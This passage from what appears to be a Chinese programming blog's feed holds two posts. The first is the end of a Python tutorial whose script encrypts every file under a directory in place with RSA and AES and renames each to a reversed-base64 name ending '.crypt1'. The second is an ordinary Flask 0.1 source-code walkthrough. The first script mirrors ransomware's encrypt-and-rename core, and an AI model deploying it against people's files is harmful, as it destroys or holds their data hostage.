os.path.join(dir,new_filename))</div></pre></td></tr></table></figure>
<p>使用了base64对文件名进行编码。</p>
<h2 id="5-2-恢复文件名"><a href="#5-2-恢复文件名" class="headerlink" title="5.2 恢复文件名"></a>5.2 恢复文件名</h2><p>举例比如: yFmcuIzZvxmY.crypt1 ==&gt; blog2.rar</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ReserveFilename</span><span class="params">(dir, filename)</span>:</span></div><div class="line">    f = filename</div><div class="line">    filename = filename[::<span class="number">-1</span>][<span class="number">7</span>:][::<span class="number">-1</span>]</div><div class="line">    filename_base64 = filename[::<span class="number">-1</span>] + <span class="string">'\n'</span></div><div class="line">    filename_bytes_base64 = filename_base64.encode(<span class="string">'utf-8'</span>)</div><div class="line">    ori_filename = base64.decodestring(filename_bytes_base64).decode(<span class="string">'utf-8'</span>)</div><div class="line">    print(os.path.join(dir, f))</div><div class="line">    print(os.path.join(dir,ori_filename))</div><div class="line">    os.rename(os.path.join(dir, f),os.path.join(dir,ori_filename))</div></pre></td></tr></table></figure>
<p>使用了base64对文件进行解码。</p>
<h1 id="六、完整源码"><a href="#六、完整源码" class="headerlink" title="六、完整源码"></a>六、完整源码</h1><p>我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateRSAKeys</span><span class="params">()</span>:</span></div><div class="line">    code = <span class="string">'nooneknows'</span></div><div class="line">    key = RSA.generate(<span class="number">2048</span>)</div><div class="line">    encrypted_key = key.exportKey(passphrase=code, pkcs=<span class="number">8</span>, protection=<span class="string">"scryptAndAES128-CBC"</span>)</div><div class="line">    <span class="comment"># 私钥</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'my_private_rsa_key.bin'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(encrypted_key)</div><div class="line">    <span class="comment"># 公钥</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'my_rsa_public.pem'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(key.publickey().exportKey())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(filename)</span>:</span>         </div><div class="line">    data = <span class="string">''</span></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">        data = f.read()</div><div class="line"></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> out_file:</div><div class="line">        <span class="comment"># 收件人秘钥 - 公钥</span></div><div class="line">        recipient_key = RSA.import_key(open(<span class="string">'my_rsa_public.pem'</span>).read())</div><div class="line">        session_key = get_random_bytes(<span class="number">16</span>)</div><div class="line"></div><div class="line">        <span class="comment"># Encrypt the session key with the public RSA key</span></div><div class="line">        cipher_rsa = PKCS1_OAEP.new(recipient_key)</div><div class="line">        out_file.write(cipher_rsa.encrypt(session_key))</div><div class="line"></div><div class="line">        <span class="comment"># Encrypt the data with the AES session key</span></div><div class="line">        cipher_aes = AES.new(session_key, AES.MODE_EAX)</div><div class="line">        ciphertext, tag = cipher_aes.encrypt_and_digest(data)</div><div class="line"></div><div class="line">        out_file.write(cipher_aes.nonce)</div><div class="line">        out_file.write(tag)</div><div class="line">        out_file.write(ciphertext)</div><div class="line">        </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Descrypt</span><span class="params">(filename)</span>:</span></div><div class="line">    code = <span class="string">'nooneknows'</span></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> fobj:</div><div class="line">        private_key = RSA.import_key(open(<span class="string">'my_private_rsa_key.bin'</span>).read(), passphrase=code)</div><div class="line">        enc_session_key, nonce, tag, ciphertext = [ fobj.read(x) </div><div class="line">                                                    <span class="keyword">for</span> x <span class="keyword">in</span> (private_key.size_in_bytes(), </div><div class="line">                                                    <span class="number">16</span>, <span class="number">16</span>, <span class="number">-1</span>) ]</div><div class="line">        cipher_rsa = PKCS1_OAEP.new(private_key)</div><div class="line">        session_key = cipher_rsa.decrypt(enc_session_key)</div><div class="line">        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)</div><div class="line">        data = cipher_aes.decrypt_and_verify(ciphertext, tag)</div><div class="line">    </div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> wobj:</div><div class="line">        wobj.write(data) </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">RenameFile</span><span class="params">(dir,filename)</span>:</span></div><div class="line">    filename_bytes = filename.encode(<span class="string">'utf-8'</span>)</div><div class="line">    filename_bytes_base64 = base64.encodestring(filename_bytes)</div><div class="line">    </div><div class="line">    filename_bytes_base64 = filename_bytes_base64[::<span class="number">-1</span>][<span class="number">1</span>:]</div><div class="line">    new_filename = filename_bytes_base64.decode(<span class="string">'utf-8'</span>) + <span class="string">'.crypt1'</span></div><div class="line"></div><div class="line">    print(os.path.join(dir, filename))</div><div class="line">    print(os.path.join(dir,new_filename))</div><div class="line">    os.rename(os.path.join(dir, filename), os.path.join(dir,new_filename))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ReserveFilename</span><span class="params">(dir, filename)</span>:</span></div><div class="line">    f = filename</div><div class="line">    filename = filename[::<span class="number">-1</span>][<span class="number">7</span>:][::<span class="number">-1</span>]</div><div class="line">    filename_base64 = filename[::<span class="number">-1</span>] + <span class="string">'\n'</span></div><div class="line">    filename_bytes_base64 = filename_base64.encode(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line">    ori_filename = base64.decodestring(filename_bytes_base64).decode(<span class="string">'utf-8'</span>)</div><div class="line">    print(os.path.join(dir, f))</div><div class="line">    print(os.path.join(dir,ori_filename))</div><div class="line">    os.rename(os.path.join(dir, f),os.path.join(dir,ori_filename))</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Main</span><span class="params">(rootDir)</span>:</span> </div><div class="line">    list_dirs = os.walk(rootDir) </div><div class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> list_dirs: </div><div class="line">        <span class="comment"># 切换加密和解密过程</span></div><div class="line">        <span class="comment">#if False: </span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">True</span>:</div><div class="line">            <span class="comment"># 遍历文件，加密并且改名</span></div><div class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> files: </div><div class="line">                filename = os.path.join(root, f)</div><div class="line">                Encrypt(filename)</div><div class="line">                RenameFile(root, f)</div><div class="line">        <span class="keyword">else</span>:   </div><div class="line">            <span class="comment"># 遍历文件，解密并且恢复名字</span></div><div class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> files: </div><div class="line">                filename = os.path.join(root, f)</div><div class="line">                Descrypt(filename)</div><div class="line">                ReserveFilename(root, f)</div><div class="line">            </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment">#CreateRSAKeys()</span></div><div class="line">    d = <span class="string">'D:\\des'</span></div><div class="line">    Main(d)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文教你如何用Python对文件进行不对称加密。&lt;/p&gt;
    
    </summary>
    
      <category term="Python进阶" scheme="https://maoao530.github.io/categories/Python%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="文件加密" scheme="https://maoao530.github.io/tags/%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86/"/>
    
      <category term="RSA" scheme="https://maoao530.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>Flask源码阅读</title>
    <link href="https://maoao530.github.io/2016/10/24/flask-source-reading/"/>
    <id>https://maoao530.github.io/2016/10/24/flask-source-reading/</id>
    <published>2016-10-24T12:26:04.000Z</published>
    <updated>2017-01-31T05:54:37.708Z</updated>
    
    <content type="html"><![CDATA[<p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。</p>
<a id="more"></a>
<p>我们先从flask 0.1版本阅读起。</p>
<h1 id="一、安装Flask-0-1"><a href="#一、安装Flask-0-1" class="headerlink" title="一、安装Flask 0.1"></a>一、安装Flask 0.1</h1><p>因为flask 0.1暂时不支持python3，所以我们使用python2.7版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">py <span class="number">-2</span> -m pip install flask==<span class="number">0.1</span></div></pre></td></tr></table></figure>
<h1 id="二、Hello-World"><a href="#二、Hello-World" class="headerlink" title="二、Hello World"></a>二、Hello World</h1><p>这是一个很简单的示例，编写hello.py，参考官方网站的示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line">app = Flask(__name__)</div><div class="line"><span class="meta">@app.route("/")</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span>    </div><div class="line">    <span class="keyword">return</span> <span class="string">"Hello World!"</span></div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>运行hello.py后，打开浏览器访问 localhost:5000可以看到浏览器输出Hello World!。</p>
<h1 id="三、知识准备"><a href="#三、知识准备" class="headerlink" title="三、知识准备"></a>三、知识准备</h1><p>在对flask有了一个比较简单的认识之后，我们知道，flask是基于Jinja2和Werkzeug的一个框架，其WSGI工具箱采用Werkzeug，模板引擎则使用 Jinja2。</p>
<h1 id="3-1-WSGI"><a href="#3-1-WSGI" class="headerlink" title="3.1 WSGI"></a>3.1 WSGI</h1><p>WSGI是Web Server Gateway Interface的缩写，是为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口。引用一张图说明WSGI的位置：</p>
<p><img src="" alt=""></p>
<p>WSGI接口定义非常简单，它只要求Web开发者实现一个函数，就可以响应HTTP请求。我们来看一个hello world：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># args:</span></div><div class="line"><span class="comment">#  - environ：一个包含所有HTTP请求信息的dict对象；</span></div><div class="line"><span class="comment">#  - start_response：一个发送HTTP响应的函数。</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></div><div class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/html'</span>)])</div><div class="line">    <span class="keyword">return</span> [<span class="string">b'&lt;h1&gt;Hello, web!&lt;/h1&gt;'</span>]</div></pre></td></tr></table></figure>
<ol>
<li>上面的application()函数就是符合WSGI标准的一个HTTP处理函数，函数必须由WSGI服务器来调用。</li>
<li>environ是一个字典，该字典可以包含了客户端请求的信息以及其他信息，可以认为是请求上下文，一般叫做environment（编码中多简写为environ、env）</li>
<li>start_response返回了http响应的header，Header只能发送一次，也就是这个函数只能调用一次。<br>有很多符合WSGI规范的服务器，我们可以挑选一个来用。比如：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> eventlet <span class="keyword">import</span> wsgi</div><div class="line"><span class="keyword">import</span> eventlet</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(environ, start_response)</span>:</span></div><div class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>)])</div><div class="line">    <span class="keyword">return</span> [<span class="string">'Hello, World!\r\n'</span>]</div><div class="line">wsgi.server(eventlet.listen((<span class="string">''</span>, <span class="number">8090</span>)), hello_world)</div></pre></td></tr></table></figure>
<h2 id="3-2-Jinja2"><a href="#3-2-Jinja2" class="headerlink" title="3.2 Jinja2"></a>3.2 Jinja2</h2><p>Jinja2是一个模板引擎，jinja2内部使用Unicode，一个比较简单的示例如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</div><div class="line">template = Template(<span class="string">'Hello &#123;&#123; name &#125;&#125;!'</span>)</div><div class="line">s = template.render(name=<span class="string">'Shun'</span>)</div><div class="line">print(s)  <span class="comment"># Hello Shun!</span></div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, PackageLoader</div><div class="line">env = Environment(loader = PackageLoader(<span class="string">'module_name'</span>, <span class="string">'templates_dir'</span>))</div><div class="line">template2 = env.get_template(<span class="string">'my_template.html'</span>) <span class="comment"># 'Hello &#123;&#123; name &#125;&#125;!'</span></div><div class="line">s = template2.render(name = <span class="string">'shun'</span>)  <span class="comment"># Hello shun!</span></div></pre></td></tr></table></figure>
<p>更高级的用法可以参考官方文档 : <a href="http://docs.jinkan.org/docs/jinja2/" target="_blank" rel="external">http://docs.jinkan.org/docs/jinja2/</a></p>
<h2 id="3-3-Werkzeug"><a href="#3-3-Werkzeug" class="headerlink" title="3.3 Werkzeug"></a>3.3 Werkzeug</h2><p>Werkzeug是一个WSGI工具包，官网将其描述为：The Python WSGI Utility Library。<br>一个简单的例子实现一个小的 Hello World 应用。显示用户输入的名字:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> escape</div><div class="line"><span class="keyword">from</span> werkzeug.wrappers <span class="keyword">import</span> Request, Response</div><div class="line"><span class="meta">@Request.application</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(request)</span>:</span></div><div class="line">    result = [<span class="string">'&lt;title&gt;Greeter&lt;/title&gt;'</span>]</div><div class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">        result.append(<span class="string">'&lt;h1&gt;Hello %s!&lt;/h1&gt;'</span> % escape(request.form[<span class="string">'name'</span>]))</div><div class="line">    result.append(<span class="string">'''</span></div><div class="line">        &lt;form action="" method="post"&gt;</div><div class="line">            &lt;p&gt;Name: &lt;input type="text" name="name" size="20"&gt;</div><div class="line">            &lt;input type="submit" value="Greet me"&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">    ''')</div><div class="line">    <span class="keyword">return</span> Response(<span class="string">''</span>.join(result), mimet ype=<span class="string">'text/html'</span>)</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">from</span> werkzeug.serving <span class="keyword">import</span> run_simple</div><div class="line">    run_simple(<span class="string">'localhost'</span>, <span class="number">8080</span>, hello_world)</div></pre></td></tr></table></figure>
<p>另外不用 request 和 response 对象也可以实现这个功能，那就是借助 werkzeug 提供的 解析函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> werkzeug.formparser <span class="keyword">import</span> parse_form_data</div><div class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> escape</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(environ, start_response)</span>:</span></div><div class="line">    result = [<span class="string">'&lt;title&gt;Greeter&lt;/title&gt;'</span>]</div><div class="line">    <span class="keyword">if</span> environ[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>:</div><div class="line">        form = parse_form_data(environ)[<span class="number">1</span>]</div><div class="line">        result.append(<span class="string">'&lt;h1&gt;Hello %s!&lt;/h1&gt;'</span> % escape(form[<span class="string">'name'</span>]))</div><div class="line">    result.append(<span class="string">'''</span></div><div class="line">        &lt;form action="" method="post"&gt;</div><div class="line">            &lt;p&gt;Name: &lt;input type="text" name="name" size="20"&gt;</div><div class="line">            &lt;input type="submit" value="Greet me"&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">    ''')</div><div class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/html; charset=utf-8'</span>)])</div><div class="line">    <span class="keyword">return</span> [<span class="string">''</span>.join(result)]</div></pre></td></tr></table></figure>
<p>通常我们更倾向于使用高级的 API(request 和 response 对象)。但是也有些情况你可能更 想使用低级功能。</p>
<h1 id="四、Flask-0-1源码分析"><a href="#四、Flask-0-1源码分析" class="headerlink" title="四、Flask-0.1源码分析"></a>四、Flask-0.1源码分析</h1><p>有了上面的基础之后，我们可以开始分析Flask的源码了。完整的源码可以参考这里：Flask.py<br>首先我们再来回顾一下Hello World是怎么样的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line">app = Flask(__name__)  </div><div class="line"><span class="meta">@app.route("/")</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span>    </div><div class="line">    <span class="keyword">return</span> <span class="string">"Hello World!"</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>先初始化一个Flask的类，然后路由hello方法，最后再run起来。</p>
<h2 id="4-1-Flask-init"><a href="#4-1-Flask-init" class="headerlink" title="4.1 Flask init()"></a>4.1 Flask init()</h2><p>我们来分析一下Flask类的初始化函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flask</span><span class="params">(object)</span>:</span></div><div class="line">    request_class = Request</div><div class="line">    response_class = Response</div><div class="line">    static_path = <span class="string">'/static'</span></div><div class="line">    secret_key = <span class="keyword">None</span></div><div class="line">    session_cookie_name = <span class="string">'session'</span></div><div class="line">    <span class="comment"># 模板参数</span></div><div class="line">    jinja_options = dict(    </div><div class="line">        autoescape=<span class="keyword">True</span>,</div><div class="line">        extensions=[<span class="string">'jinja2.ext.autoescape'</span>, <span class="string">'jinja2.ext.with_'</span>]</div><div class="line">    )</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, package_name)</span>:</span></div><div class="line">        self.debug = <span class="keyword">False</span>                  <span class="comment"># 如果设置为True，则改完code后，服务器会自动部署（reload）  </span></div><div class="line">        self.package_name = package_name    <span class="comment"># __main__        </span></div><div class="line">        self.root_path = _get_package_path(self.package_name)      </div><div class="line">        self.view_functions = &#123;&#125;            <span class="comment"># 保存url视图函数名到函数地址的映射    </span></div><div class="line">        self.error_handlers = &#123;&#125;            <span class="comment"># 保存错误函数，@app.errorhandler(404)...     </span></div><div class="line">        self.before_request_funcs = []      <span class="comment"># 保存request前执行的一些函数，比如打开数据库等     </span></div><div class="line">        self.after_request_funcs = []       <span class="comment"># 保存request后执行的一些函数</span></div><div class="line">        </div><div class="line">        self.template_context_processors = [_default_template_ctx_processor]</div><div class="line">        </div><div class="line">        self.url_map = Map()                </div><div class="line">        </div><div class="line">        <span class="comment"># ???</span></div><div class="line">        <span class="keyword">if</span> self.static_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            self.url_map.add(Rule(self.static_path + <span class="string">'/&lt;filename&gt;'</span>,</div><div class="line">                                  build_only=<span class="keyword">True</span>, endpoint=<span class="string">'static'</span>))</div><div class="line">            <span class="keyword">if</span> pkg_resources <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                target = (self.package_name, <span class="string">'static'</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                target = os.path.join(self.root_path, <span class="string">'static'</span>)</div><div class="line">            self.wsgi_app = SharedDataMiddleware(self.wsgi_app, &#123;</div><div class="line">                self.static_path: target</div><div class="line">            &#125;)    </div><div class="line">        self.jinja_env = Environment(loader=self.create_jinja_loader(),</div><div class="line">                                     **self.jinja_options)</div><div class="line">        self.jinja_env.globals.update(</div><div class="line">            url_for=url_for,</div><div class="line">            get_flashed_messages=get_flashed_messages</div><div class="line">        )</div></pre></td></tr></table></figure>
<p>template_context_processors的内容涉及context，这个后面再讲。</p>
<p>self.url_map这个函数保存了URI（访问的后缀URL,比如/，/index/等）到视图函数字典的映射,我们可以看到路由这个函数是如何实现的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rule : URI比如 '\'</span></div><div class="line"><span class="comment"># options : 这里是空的字典 &#123;&#125;，用于后面保存URI对应的访问规则，比如GET or POST，函数名等。</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">route</span><span class="params">(self, rule, **options)</span>:</span></div><div class="line">    <span class="comment"># f指向实际执行的函数地址</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(f)</span>:</span></div><div class="line">        self.add_url_rule(rule, f.__name__, **options)</div><div class="line">        self.view_functions[f.__name__] = f</div><div class="line">        <span class="keyword">return</span> f</div><div class="line">    <span class="keyword">return</span> decorator</div><div class="line"><span class="comment"># rule : URI</span></div><div class="line"><span class="comment"># endpoint : 函数名字符串</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_url_rule</span><span class="params">(self, rule, endpoint, **options)</span>:</span>       </div><div class="line">    options[<span class="string">'endpoint'</span>] = endpoint</div><div class="line">    options.setdefault(<span class="string">'methods'</span>, (<span class="string">'GET'</span>,))</div><div class="line">    self.url_map.add(Rule(rule, **options))</div></pre></td></tr></table></figure>
<p>假如我们写了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">app.route(&apos;/&apos;)</div><div class="line">def hello():</div><div class="line">    print(&apos;hello shun.&apos;)</div></pre></td></tr></table></figure>
<p>相当于执行了:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hello = app.route(<span class="string">'/'</span>)(hello)</div></pre></td></tr></table></figure>
<p>对装饰器不太熟悉的同学，可以参考我的另外一篇文章:<a href="http://maoao530.github.io/2016/05/17/python-decorator/">Python 装饰器decorator</a></p>
<h2 id="4-2-wsgi-app"><a href="#4-2-wsgi-app" class="headerlink" title="4.2 wsgi_app"></a>4.2 wsgi_app</h2><p>当我们执行app.run函数的时候,最终会执行到wsgi_app函数，这个函数是Flask的入口核心函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">app.run()</div><div class="line">    run_simple(host, port, self, **options)</div><div class="line">        __call__(self, environ, start_response)</div><div class="line">            wsgi_app(self, environ, start_response)</div></pre></td></tr></table></figure>
<p>最终会执行wsgi_app，这个函数是flask的入口，也是核心：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wsgi_app</span><span class="params">(self, environ, start_response)</span>:</span></div><div class="line">    <span class="keyword">with</span> self.request_context(environ):         <span class="comment"># 创建request context</span></div><div class="line">        rv = self.preprocess_request()          <span class="comment"># 先调用预处理函数</span></div><div class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">None</span>:        </div><div class="line">            rv = self.dispatch_request()        <span class="comment"># 分发请求</span></div><div class="line">        response = self.make_response(rv)       <span class="comment"># </span></div><div class="line">        response = self.process_response(response)</div><div class="line">        <span class="keyword">return</span> response(environ, start_response)</div></pre></td></tr></table></figure>
<h3 id="4-2-1-生成request-context"><a href="#4-2-1-生成request-context" class="headerlink" title="4.2.1 生成request_context"></a>4.2.1 生成request_context</h3><p>我们一个一个来分析，先看是如何创建request context的：</p>
